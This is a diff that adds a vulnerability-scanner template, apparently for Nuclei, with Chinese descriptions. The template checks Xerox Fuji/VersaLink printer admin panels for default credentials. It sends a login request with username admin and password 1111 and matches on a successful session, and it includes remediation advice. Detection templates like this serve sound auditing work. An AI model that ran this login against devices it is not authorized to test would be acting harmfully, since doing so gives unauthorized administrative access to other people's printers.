@@ -1,0 +1,47 @@
+id: xerox-fuji-versalink-default-login
+
+info:
+  name: Xerox Fuji 设备默认凭据登录漏洞
+  author: DhiyaneshDk
+  severity: high
+  description: |
+    在设备初始化或管理后台配置阶段，使用默认凭据（用户名为 admin，密码为 1111 或设备序列号）成功登录 Xerox Fuji/VersaLink 管理面板，导致未授权访问风险。
+  reference:
+    - https://www.support.xerox.com/en-us/article/KB0136271
+  metadata:
+    verified: true
+    max-request: 1
+  tags: 富士施乐打印机,FUJI_Xerox-ColorQube
+  remediation: >-
+    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。
+
+variables:
+  username: admin
+  password: 1111
+
+http:
+  - raw:
+      - |
+        POST /LOGIN.cmd HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/home/index.html
+
+        NAME={{base64(username)}}&PSW={{base64(password)}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"result":"0"'
+          - '"errorCode":"0"'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - "ssid="
+      - type: status
+        status:
+          - 200
+
+# digest: 490a0046304402203a0d748cd9fe8e128cfcd6ba3a5821a49698e5a8a4b5db6fd0002de03cdb68dc02207b4a2fecde99c11012ac60feea13e0c93764504c39427e7573c5ec3c126b8522:922c64590222798bb761d5b6d8e72950
